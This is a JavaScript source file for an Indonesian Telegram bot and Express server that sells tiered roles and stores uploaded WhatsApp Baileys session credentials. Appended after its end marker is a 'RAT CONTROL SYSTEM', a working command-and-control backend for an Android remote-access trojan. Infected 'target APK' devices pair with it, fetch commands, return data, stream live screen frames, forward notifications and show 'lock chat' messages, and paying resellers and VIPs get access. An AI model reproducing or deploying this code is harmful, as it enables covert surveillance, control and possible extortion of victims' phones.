                    [{ text: "⭐ Storan Paket VIP", callback_data: "storan_vip", style: "primary" }],
                    [{ text: "💎 Storan Paket PT", callback_data: "storan_pt", style: "primary" }],
                    [{ text: "👑 Storan Paket OWNER", callback_data: "storan_owner", style: "primary" }],
                    [{ text: "❌ Batal", callback_data: "storan_batal", style: "danger" }]
                ];
            } else if (isPt) {
                storanButtons = [
                    [{ text: "👤 Storan Paket MEMBER", callback_data: "storan_member", style: "primary" }],
                    [{ text: "📈 Storan Paket RESELLER", callback_data: "storan_reseller", style: "primary" }],
                    [{ text: "⭐ Storan Paket VIP", callback_data: "storan_vip", style: "primary" }],
                    [{ text: "💎 Storan Paket PT", callback_data: "storan_pt", style: "primary" }],
                    [{ text: "❌ Batal", callback_data: "storan_batal", style: "danger" }]
                ];
            } else if (isReseller) {
                storanButtons = [
                    [{ text: "👤 Storan Paket MEMBER", callback_data: "storan_member", style: "primary" }],
                    [{ text: "⭐ Storan Paket VIP", callback_data: "storan_vip", style: "primary" }],
                    [{ text: "📈 Storan Paket RESELLER", callback_data: "storan_reseller", style: "primary" }],
                    [{ text: "❌ Batal", callback_data: "storan_batal", style: "danger" }]
                ];
            } else if (isVip) {
                storanButtons = [
                    [{ text: "👤 Storan Paket MEMBER", callback_data: "storan_member", style: "primary" }],
                    [{ text: "⭐ Storan Paket VIP", callback_data: "storan_vip", style: "primary" }],
                    [{ text: "❌ Batal", callback_data: "storan_batal", style: "danger" }]
                ];
            } else if (isFullup) {
                storanButtons = [
                    [{ text: "👤 Storan Paket MEMBER", callback_data: "storan_member", style: "primary" }],
                    [{ text: "❌ Batal", callback_data: "storan_batal", style: "danger" }]
                ];
            } else {
                storanButtons = [
                    [{ text: "❌ Anda tidak memiliki akses Storan", callback_data: "storan_batal", style: "danger" }]
                ];
            }
            await ctx.replyWithHTML(`<blockquote>📦 Pilih Paket Storan:</blockquote>`, {
                parse_mode: "HTML",
                reply_markup: { inline_keyboard: storanButtons }
            });
            break;
        case "storan_member":
        case "storan_reseller":
        case "storan_vip":
        case "storan_pt":
        case "storan_owner":
        case "storan_developer": {
            const packageMap = {
                storan_member: { key: "member", name: "MEMBER" },
                storan_reseller: { key: "reseller", name: "RESELLER" },
                storan_vip: { key: "vip", name: "VIP" },
                storan_pt: { key: "pt", name: "PT" },
                storan_owner: { key: "owner", name: "OWNER" },
                storan_developer: { key: "developer", name: "DEVELOPER" }
            };
            const pkg = packageMap[data];
            if (!pkg) break;
            const storanData = loadStoranData();
            storanData.pending.push({
                id: generateStoranId(),
                userId: userId,
                package: pkg.key,
                packageName: pkg.name,
                step: "waiting_username",
                username: null,
                ssImage: null,
                qrCode: null,
                ssQrImage: null,
                status: "pending"
            });
            saveStoranData(storanData);
            await ctx.replyWithHTML(`<blockquote>📦 Storan Paket ${pkg.name}\n\nKirimkan ID Telegram yang mau di-stor:</blockquote>`);
            break;
        }
        case "storan_batal":
            await ctx.replyWithHTML(`<blockquote>❌ Storan dibatalkan.</blockquote>`);
            break;
        case "list_user":
            if (!isOwner && !isDev) {
                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan.</blockquote>`);
            }
            const users = getFormattedUsers();
            await ctx.replyWithHTML(`<blockquote>📋 Daftar Pengguna:\n${users}</blockquote>`);
            break;
        case "delete_user":
            if (!isOwner && !isDev) {
                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan.</blockquote>`);
            }
            deleteUserState[userId] = { step: "waiting_username" };
            await ctx.replyWithHTML(`<blockquote>Masukkan username yang akan dihapus:</blockquote>`);
            break;
        case "set_expire":
            setExpireState[userId] = { step: "waiting_data" };
            await ctx.replyWithHTML(`<blockquote>Masukkan: username|tambah_hari</blockquote>`);
            break;
        case "list_command":
            await ctx.replyWithHTML(`<blockquote>📋 LIST COMMAND\n\n/start - Menu Utama\n/info - Info User\n/addreseller - Add Reseller\n/addvip - Add VIP\n/addpt - Add PT\n/addowner - Add Owner\n/adddev - Add Developer\n/clear - Bersihkan Session\n/restart - Restart Server</blockquote>`);
            break;
        default:
            await ctx.replyWithHTML(`<blockquote>❌ Fitur tidak dikenal.</blockquote>`);
    }

    // Refresh menu
    let role = null;
    if (isDev) role = 'developer';
    else if (isOwner) role = 'owner';
    else if (isPt) role = 'pt';
    else if (isVip) role = 'vip';
    else if (isReseller) role = 'reseller';
    else if (isFullup) role = 'fullup';
    else role = 'member';
    if (role && !data.startsWith('storan')) {
        setTimeout(() => {
            menuAnimation = setInterval(async () => {
                try {
                    await ctx.telegram.editMessageReplyMarkup(
                        menuMsg.chat_id,
                        menuMsg.message_id,
                        null,
                        getMainKeyboard(role)
                    );
                } catch (err) {}
            }, 3000);
        }, 1000);
    }
});

bot.on('photo', async (ctx) => {
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;
    const photoId = ctx.message.photo[ctx.message.photo.length - 1].file_id;

    const storanData = loadStoranData();
    const pending = storanData.pending.find(s => s.userId === userId);

    if (pending && pending.step === "waiting_ss") {
        return handleStoranSS(chatId, userId, photoId);
    } else if (pending && pending.step === "waiting_qr_ss") {
        return handleStoranQrSS(chatId, userId, photoId);
    }
});

bot.on('document', async (ctx) => {
    const chatId = ctx.chat.id;
    const document = ctx.message.document;
    const fileName = document.file_name || '';

    if (!fileName.endsWith('.json')) {
        return bot.telegram.sendMessage(chatId, '❌ Hanya file .json yang didukung!');
    }

    try {
        const file = await bot.telegram.getFile(document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
        const buffer = await downloadToBuffer(fileUrl);
        const jsonData = JSON.parse(buffer.toString());

        if (!isValidBaileysCreds(jsonData)) {
            return bot.telegram.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
        }

        const userFolder = path.join(__dirname, 'permenmd');
        if (!fs.existsSync(userFolder)) {
            fs.mkdirSync(userFolder, { recursive: true });
        }

        let finalName = fileName;
        const savePath = path.join(userFolder, finalName);

        if (fs.existsSync(savePath)) {
            const randomSuffix = Date.now();
            const base = path.basename(fileName, '.json');
            finalName = `${base}-${randomSuffix}.json`;
        }

        const finalSavePath = path.join(userFolder, finalName);
        fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

        await bot.telegram.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
        console.error('[ERROR] Upload creds:', err);
        await bot.telegram.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
});

// ========== STORAN FUNCTIONS ==========
function handleStoranUsername(chatId, userId, text) {
    const storanData = loadStoranData();
    const pending = storanData.pending.find(s => s.userId === userId && s.step === "waiting_username");
    if (!pending) {
        return bot.telegram.sendMessage(chatId, `<blockquote>❌ Tidak ada sesi storan aktif.</blockquote>`, { parse_mode: "HTML" });
    }
    pending.username = text.trim();
    pending.step = "waiting_ss";
    saveStoranData(storanData);
    bot.telegram.sendMessage(chatId, `<blockquote>📸 Kirimkan Screenshot Bukti Trx Buyer (TRX):</blockquote>`, { parse_mode: "HTML" });
}

async function handleStoranApprove(approverId, storanId, action, ctx) {
    const storanData = loadStoranData();
    const index = storanData.pending.findIndex(s => s.id === storanId);
    if (index === -1) {
        await ctx.replyWithHTML(`<blockquote>❌ Data storan tidak ditemukan.</blockquote>`);
        return;
    }
    const pending = storanData.pending[index];
    const userId = pending.userId;

    if (action === "tolak") {
        try { await bot.telegram.sendMessage(userId, `<blockquote>❌ Bukti Trx DITOLAK!</blockquote>`, { parse_mode: "HTML" }); } catch (err) {}
        storanData.pending.splice(index, 1);
        saveStoranData(storanData);
        await ctx.replyWithHTML(`<blockquote>✅ Storan ${storanId} telah DITOLAK.</blockquote>`);
        return;
    }

    pending.step = "waiting_qr_ss";
    saveStoranData(storanData);

    try {
        await bot.telegram.sendPhoto(userId, QR_CODE_PAYMENT, {
            caption: `<blockquote>✅ Bukti Transfer DITERIMA!\n\n📱 Scan QR Code di atas untuk transfer:\n\n📦 Paket: ${pending.packageName}\n👤 Username: ${pending.username}\n\n💰 Transfer 50% dari harga role paket.\n\n📌 Setelah transfer, kirim Bukti TF nya.</blockquote>`,
            parse_mode: "HTML"
        });
        await ctx.replyWithHTML(`<blockquote>✅ Storan ${storanId} DITERIMA. QR Code telah dikirim ke user.</blockquote>`);
    } catch (err) {
        await ctx.replyWithHTML(`<blockquote>⚠️ Gagal kirim QR ke user. Pastikan user sudah chat dengan bot.</blockquote>`);
        storanData.pending.splice(index, 1);
        saveStoranData(storanData);
    }
}

async function handleStoranQrApprove(approverId, storanId, action, ctx) {
    const storanData = loadStoranData();
    const index = storanData.pending.findIndex(s => s.id === storanId);
    if (index === -1) {
        await ctx.replyWithHTML(`<blockquote>❌ Data storan tidak ditemukan.</blockquote>`);
        return;
    }
    const pending = storanData.pending[index];
    const userId = pending.userId;
    const targetId = pending.username;
    const packageKey = pending.package;

    if (action === "tolak") {
        try { await bot.telegram.sendMessage(userId, `<blockquote>❌ Bukti TF DITOLAK!</blockquote>`, { parse_mode: "HTML" }); } catch (err) {}
        storanData.pending.splice(index, 1);
        saveStoranData(storanData);
        await ctx.replyWithHTML(`<blockquote>✅ Bukti TF ${storanId} telah DITOLAK.</blockquote>`);
        return;
    }

    const targetTelegramId = parseInt(targetId);
    if (isNaN(targetTelegramId)) {
        await ctx.replyWithHTML(`<blockquote>❌ ID '${targetId}' tidak valid!</blockquote>`);
        storanData.pending.splice(index, 1);
        saveStoranData(storanData);
        return;
    }

    const config = loadTelegramConfig();
    const roleMap = {
        member: "userList",
        reseller: "resellerList",
        vip: "vipList",
        pt: "ptList",
        owner: "ownerList",
        developer: "devList"
    };
    const roleListKey = roleMap[packageKey] || "userList";
    if (!config[roleListKey]) config[roleListKey] = [];
    if (!config[roleListKey].includes(targetTelegramId)) {
        config[roleListKey].push(targetTelegramId);
        fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
    }

    try {
        await bot.telegram.sendMessage(userId, `<blockquote>✅ STORAN SUKSES!\n\n🆔 ID: ${targetTelegramId}\n📦 Paket: ${pending.packageName}</blockquote>`, { parse_mode: "HTML" });
    } catch (err) {}
    await ctx.replyWithHTML(`<blockquote>✅ STORAN SELESAI!\n\n🆔 ${targetTelegramId}\n📦 ${pending.packageName}</blockquote>`);
    storanData.pending.splice(index, 1);
    saveStoranData(storanData);
}

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *KETIK*\n\n⚠️ /ckey,name,999d,id_telegram.", { parse_mode: "Markdown" });
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ [SYSTEM] *ERROR: DIRECTORY NOT FOUND*\n\nTarget folder 'permenmd' does not exist.", { parse_mode: "Markdown" });
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);
      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    const responseMsg = deletedCount > 0 
      ? `🗑️ [SYSTEM] *GARBAGE COLLECTOR*\n\n✅ Purged ${deletedCount} corrupted/empty session folders.`
      : `✨ [SYSTEM] *NO JUNK FOUND*\n\nServer storage is clean.`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
    console.log(`[LOG] Purged ${deletedCount} junk folders.`);
  } catch (err) {
    bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ Root access required for this action.", { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, "⚙️ [SERVER] *SYSTEM REBOOT*\n\nSending SIGTERM...\nReason: Manual Request\nStatus: *RESTARTING*...", { parse_mode: "Markdown" });
  await unfollowAllChannel();
  console.log("[SERVER] Manual restart triggered by Owner.");

  setTimeout(() => {
    process.exit(0);
  }, 2000);
});

setTimeout(() => {
    const targetChatId = "-1003972861173"; 
    bot.sendMessage(targetChatId, "✅ [SERVER] *SERVICES ONLINE*\n\nSystem Status: *RUNNING*\nUptime: Just started\n✅ All systems operational.", { parse_mode: "Markdown" });
  }, 3000);

function scheduleAutoClean() {
  const now = new Date();
  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);

  if (now >= nextMidnight) {
    nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  }

  const delay = nextMidnight - now;
  setTimeout(() => {
    hapusIsiUserLogs();
    setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
  }, delay);
}

// ========== AUTO RESTART SYSTEM ==========
let restartCount = 0;
let serverStartTime = Date.now();
const AUTO_RESTART_INTERVAL = 6 * 60 * 60 * 1000;

function getFormattedDateTime() {
    const now = new Date();
    const tanggal = now.toLocaleDateString('id-ID', {
        weekday: 'long',
        day: 'numeric',
        month: 'long',
        year: 'numeric'
    });
    const waktu = now.toLocaleTimeString('id-ID', {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
    return { waktu, tanggal };
}

function getUptime() {
    const uptimeMs = Date.now() - serverStartTime;
    const seconds = Math.floor(uptimeMs / 1000);
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    
    let result = '';
    if (days > 0) result += `${days}d `;
    if (hours > 0 || days > 0) result += `${hours}h `;
    if (minutes > 0 || hours > 0 || days > 0) result += `${minutes}m `;
    result += `${secs}s`;
    return result;
}

function getRestartReason() {
    const reasons = [
        "Scheduled maintenance",
        "Memory optimization",
        "Cache cleanup",
        "Session refresh",
        "Performance enhancement"
    ];
    return reasons[restartCount % reasons.length];
}

function buildRestartMessage() {
    const { waktu, tanggal } = getFormattedDateTime();
    const uptime = getUptime();
    const reason = getRestartReason();
    
    return `
╔══════════════════════════════╗
║   🔄  AUTO RESTART SERVER   ║
╚══════════════════════════════╝

⏰ Waktu     : ${waktu}
📅 Tanggal   : ${tanggal}
🔁 Restart ke: ${restartCount + 1}
⏳ Uptime    : ${uptime}

♻️ Status    : 🔄 RESTARTING
🛡️ Alasan    : ${reason}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 Server akan kembali aktif dalam beberapa detik.
`;
}

async function sendRestartNotification() {
    const message = buildRestartMessage();
    console.log('[AUTO RESTART]', message);
    
    try {
        if (TARGET_GROUP_ID) {
            await sendWithPhoto(TARGET_GROUP_ID, message);
        }
        await bot.sendMessage(OWNER_ID, message, { parse_mode: 'HTML' });
    } catch (e) {
        console.error('[AUTO RESTART] Gagal kirim notifikasi:', e.message);
    }
}

function performAutoRestart() {
    restartCount++;
    console.log(`[AUTO RESTART] Memulai restart ke-${restartCount}...`);
    
    sendRestartNotification().then(() => {
        setTimeout(() => {
            console.log('[AUTO RESTART] Melakukan restart server...');
            serverStartTime = Date.now();
            disconnectAllVPS();
            disconnectAllActiveConnections().then(() => {
                console.log('[AUTO RESTART] Server restart selesai, semua koneksi ditutup.');
                setTimeout(() => {
                    console.log('[AUTO RESTART] Menghubungkan ulang sessions...');
                    startVipSessions();
                    startUserSessions();
                    connectToAllVPS();
                    console.log('[AUTO RESTART] Server kembali online!');
                    
                    const onlineMsg = `
╔══════════════════════════════╗
║   ✅  SERVER BACK ONLINE    ║
╚══════════════════════════════╝

⏰ Waktu     : ${new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
📅 Tanggal   : ${new Date().toLocaleDateString('id-ID', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' })}
🔄 Restart ke: ${restartCount}

♻️ Status    : ✅ ONLINE
🛡️ System    : Vexorv Server

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 Server siap digunakan kembali.
`;
                    sendWithPhoto(TARGET_GROUP_ID, onlineMsg).catch(() => {});
                }, 3000);
            });
        }, 3000);
    }).catch((e) => {
        console.error('[AUTO RESTART] Error:', e.message);
    });
}

function scheduleAutoRestart() {
    console.log(`[AUTO RESTART] Auto restart dijadwalkan setiap ${AUTO_RESTART_INTERVAL / 3600000} jam.`);
    setInterval(performAutoRestart, AUTO_RESTART_INTERVAL);
}

scheduleAutoRestart();

async function autoRefresh() {
  console.log('[AUTO REFRESH] Menjalankan refresh sessions...');
  try {
    await startUserSessions();
    await startVipSessions();
    console.log('[AUTO REFRESH] Sessions berhasil direfresh.');
  } catch (err) {
    console.error('[AUTO REFRESH] Error:', err.message);
  }
}

console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
console.log(`    VEXORV - SERVER   `);
console.log(`    STATUS : ACTIVE          `);
console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

// ===== START SERVER =====
console.log(`🚀 Server aktif di http://${Domain}:${PORT}`);
startVipSessions();
startUserSessions();

console.log(`[AUTO REFRESH] Diatur setiap 30 menit sekali.`);
setInterval(autoRefresh, THIRTY_MINUTES);
console.log(`[AUTOCLEAN LOGS] Diatur setiap jam 12 malam WIB.`);
scheduleAutoClean();

// ============================================================
// END OF INDEX.JS
// ============================================================

// ════════════════════════════════════════════════════════════════════════════
// ██████████  RAT CONTROL SYSTEM  ██████████████████████████████████████████
// ════════════════════════════════════════════════════════════════════════════

const RAT_TARGETS = './rat_targets.json';
const RAT_LIVE    = {};
const RAT_ALLOWED = ['owner','high owner','high admin','admin','vip','reseller'];

function readRat(f) {
  try { return JSON.parse(fs.existsSync(f) ? fs.readFileSync(f,'utf8')||'[]' : '[]'); } catch { return []; }
}
function saveRat(f,d) { try { fs.writeFileSync(f, JSON.stringify(d,null,2)); } catch(_) {} }
function genPairId() { return crypto.randomBytes(8).toString('hex').toUpperCase(); }

// ── Role Guard: blok member ─────────────────────────────────────────────────
function ratGuard(req, res, next) {
  const key = req.query.key || req.body?.key;

  const user = getUserByKey(key);

  if (!user) {
    return res.json({
      valid: false,
      message: 'Invalid key'
    });
  }

  const role = (user.role || '').toLowerCase();

  if (!RAT_ALLOWED.includes(role)) {
    return res.json({
      valid: false,
      message: 'Akses ditolak. Fitur RAT hanya untuk Owner, Admin, VIP, dan Reseller.'
    });
  }

  req._ratUser = user;
  next();
}

// ── Startup: generate pairId untuk semua user yang belum punya ──────────────
(function generateAllPairIds() {
  try {
    const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
    let changed = false;
    for (let i = 0; i < db.length; i++) {
      if (!db[i].pairId) { db[i].pairId = genPairId(); changed = true; console.log(`[RAT-STARTUP] pairId generated: ${db[i].username} → ${db[i].pairId}`); }
    }
    if (changed) fs.writeFileSync('./database.json', JSON.stringify(db,null,2));
    else console.log('[RAT-STARTUP] All users already have pairId');
  } catch(e) { console.error('[RAT-STARTUP] Error:', e.message); }
})();

// ── Device Permission Endpoints ─────────────────────────────────────────────
app.get('/devicePerms', ratGuard, (req, res) => {
  const { username } = req.query;
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '{}');
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  const role = (req._ratUser.role||'').toLowerCase();
  const isHighRole = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
  // Jika yang dicek adalah diri sendiri dan role tinggi → auto approve
  if (isHighRole && (!username || username === req._ratUser.username)) {
    return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
  }
  const ownerPerms = perms[req._ratUser.username] || {};
  const targetPerm = ownerPerms[username] || { approved: false, allDevices: false, devices: [] };
  res.json({ valid: true, ...targetPerm });
});

app.post('/setDevicePerm', ratGuard, (req, res) => {
  const { username, approved, allDevices, devices } = req.body;
  const role = (req._ratUser.role||'').toLowerCase();
  const canSetPerm = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
  if (!canSetPerm) return res.json({ valid: false, message: 'Role tidak diizinkan set permission' });
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  if (!perms[req._ratUser.username]) perms[req._ratUser.username] = {};
  perms[req._ratUser.username][username] = { approved: !!approved, allDevices: !!allDevices, devices: devices||[] };
  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
  res.json({ valid: true });
});

app.get('/listDevicePerms', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  const canList = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
  if (!canList) return res.json({ valid: false, message: 'Role tidak diizinkan' });
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  res.json({ valid: true, perms: perms[req._ratUser.username] || {} });
});

app.get('/api/device/getPerms',  ratGuard, (req, res) => { req.url = '/devicePerms?'   + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/device/setPerm',  ratGuard, (req, res) => { req.url = '/setDevicePerm?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/device/listPerms', ratGuard, (req, res) => { req.url = '/listDevicePerms?'+(req.url.split('?')[1]||''); app.handle(req, res); });

// ── RAT Core Endpoints ──────────────────────────────────────────────────────
app.get('/rat/pairid', ratGuard, (req, res) => {
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const idx = db.findIndex(u => u.username === req._ratUser.username);
  if (idx === -1) return res.json({ valid: false, message: 'User not found' });
  if (!db[idx].pairId) { db[idx].pairId = genPairId(); fs.writeFileSync('./database.json', JSON.stringify(db,null,2)); }
  res.json({ valid: true, pairId: db[idx].pairId });
});

app.post('/rat/grant-member', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  const canGrant = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
  if (!canGrant) return res.json({ valid: false, message: 'Role tidak diizinkan grant akses' });
  const { memberUsername } = req.body;
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  if (!perms[req._ratUser.username]) perms[req._ratUser.username] = {};
  perms[req._ratUser.username][memberUsername] = { approved: true, allDevices: true, devices: [] };
  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
  res.json({ valid: true });
});

app.post('/rat/revoke-member', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  const canRevoke = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
  if (!canRevoke) return res.json({ valid: false, message: 'Role tidak diizinkan revoke akses' });
  const { memberUsername } = req.body;
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  if (perms[req._ratUser.username]) delete perms[req._ratUser.username][memberUsername];
  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
  res.json({ valid: true });
});

app.get('/rat/my-devices', ratGuard, (req, res) => {
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const user = req._ratUser;
  const targets = readRat(RAT_TARGETS);
  const role = (user.role||'').toLowerCase();
  const isOwnerLevel = ['owner','high owner'].includes(role);
  const isAdminLevel = ['high admin','admin'].includes(role);
  const isResellerVip = ['reseller','vip'].includes(role);
  let devices;

  if (isOwnerLevel || isAdminLevel || isResellerVip) {
    // Semua role tinggi langsung pakai pairId sendiri → lihat device milik sendiri
    const dbUser = db.find(u => u.username === user.username);
    if (!dbUser) return res.json({ valid: true, devices: [] });
    // Auto-approve diri sendiri di rat_perms supaya APK tidak tampilkan "Akses belum disetujui"
    try {
      const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
      if (!perms[user.username]) perms[user.username] = {};
      if (!perms[user.username][user.username]) {
        perms[user.username][user.username] = { approved: true, allDevices: true, devices: [] };
        fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
      }
    } catch(_) {}
    devices = targets.filter(t => t.ownerPairId === dbUser.pairId);
  } else {
    // Member atau role lain → cek perms dari owner
    const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
    const ownerEntry = Object.entries(perms).find(([,p]) => p[user.username]?.approved);
    if (!ownerEntry) return res.json({ valid: true, devices: [] });
    const [ownerName, ownerPerms] = ownerEntry;
    const perm = ownerPerms[user.username];
    const ownerUser = db.find(u => u.username === ownerName);
    const ownerDevices = targets.filter(t => t.ownerPairId === ownerUser?.pairId);
    devices = perm.allDevices ? ownerDevices : ownerDevices.filter(d => perm.devices?.includes(d.id));
  }
  res.json({ valid: true, devices });
});

// ── Pair + Command + Response ────────────────────────────────────────────────
app.post('/api/pair-target', (req, res) => {
  // Endpoint ini dipanggil dari APK target (bukan dari user login), jadi pakai pairId bukan sessionKey
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) return res.status(400).json({ error: 'Missing fields' });
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const owner = db.find(u => u.pairId === pairId);
  if (!owner) return res.status(403).json({ error: 'Invalid pairId' });
  let t = readRat(RAT_TARGETS);
  const idx = t.findIndex(d => d.id === deviceId);
  const entry = { id: deviceId, model: model||'Unknown', battery: battery||'?', ownerPairId: pairId, lastSeen: new Date().toISOString() };
  if (idx >= 0) t[idx] = { ...t[idx], ...entry }; else t.push(entry);
  saveRat(RAT_TARGETS, t);
  res.json({ valid: true, message: 'Paired' });
});

app.post('/api/send-command', ratGuard, (req, res) => {
  const { id, command, extra } = req.body;
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.id !== id);
  cmds.push({ id, command, extra: extra||'', ts: Date.now() });
  saveRat('./rat_commands.json', cmds);
  res.json({ valid: true });
});

app.get('/api/get-command/:id', (req, res) => {
  // Dipanggil dari APK target, no auth needed
  let cmds = readRat('./rat_commands.json');
  const cmd = cmds.find(c => c.id === req.params.id);
  if (!cmd) return res.json({});
  cmds = cmds.filter(c => c.id !== req.params.id);
  saveRat('./rat_commands.json', cmds);
  let t = readRat(RAT_TARGETS);
  const idx = t.findIndex(d => d.id === req.params.id);
  if (idx >= 0) { t[idx].lastSeen = new Date().toISOString(); saveRat(RAT_TARGETS, t); }
  res.json(cmd);
});

app.post('/api/post-response/:id', (req, res) => {
  // Dari APK target, no auth
  let resp = readRat('./rat_responses.json');
  resp = resp.filter(r => r.id !== req.params.id);
  resp.push({ id: req.params.id, cmd: req.body.cmd||'', data: req.body.data||{}, ts: Date.now() });
  saveRat('./rat_responses.json', resp);
  res.json({ valid: true });
});

app.get('/api/get-response/:id', ratGuard, (req, res) => {
  const resp = readRat('./rat_responses.json');
  const r = resp.find(r => r.id === req.params.id);
  res.json(r || {});
});

// ── Live Frame ───────────────────────────────────────────────────────────────
app.post('/api/live-frame/:id', (req, res) => {
  // Dari APK target, no auth
  const { frame, ts } = req.body;
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ valid: true });
});

app.get('/api/live-frame/:id', ratGuard, (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d || Date.now() - d.ts > 5000) return res.json({ frame: '' });
  res.json({ frame: d.frame });
});

// ── Notifications ────────────────────────────────────────────────────────────
app.post('/api/post-notification/:id', (req, res) => {
  // Dari APK target, no auth
  let notifs = readRat('./rat_notifs.json');
  notifs.push({ id: req.params.id, ...req.body, ts: Date.now() });
  if (notifs.length > 200) notifs = notifs.slice(-200);
  saveRat('./rat_notifs.json', notifs);
  res.json({ valid: true });
});

app.get('/api/get-notifications/:id', ratGuard, (req, res) => {
  const notifs = readRat('./rat_notifs.json');
  res.json(notifs.filter(n => n.id === req.params.id).slice(-50));
});

// ── Lock Chat ────────────────────────────────────────────────────────────────
app.post('/api/lock-chat/:id', ratGuard, (req, res) => {
  let chats = readRat('./rat_chats.json');
  if (!Array.isArray(chats)) chats = [];
  chats.push({ id: req.params.id, from: req.body.from||'owner', text: req.body.text||'', time: new Date().toLocaleTimeString('id-ID') });
  if (chats.length > 500) chats = chats.slice(-500);
  saveRat('./rat_chats.json', chats);
  res.json({ valid: true });
});

app.get('/api/lock-chat/:id', (req, res) => {
  // Dari APK target boleh baca chat
  const chats = readRat('./rat_chats.json');
  const last = chats.filter(c => c.id === req.params.id).slice(-1)[0];
  res.json(last || {});
});

app.get('/api/lock-chat-all/:id', ratGuard, (req, res) => {
  const chats = readRat('./rat_chats.json');
  res.json({ messages: chats.filter(c => c.id === req.params.id).slice(-100) });
});

app.delete('/api/lock-chat/:id', ratGuard, (req, res) => {
  let chats = readRat('./rat_chats.json');
  chats = chats.filter(c => c.id !== req.params.id);
  saveRat('./rat_chats.json', chats);
  res.json({ valid: true });
});

// ── Auto cleanup setiap jam ───────────────────────────────────────────────────
['rat_targets','rat_commands','rat_responses','rat_notifs'].forEach(f => {
  setInterval(() => {
    try {
      let data = readRat(`./${f}.json`);
      const now = Date.now();
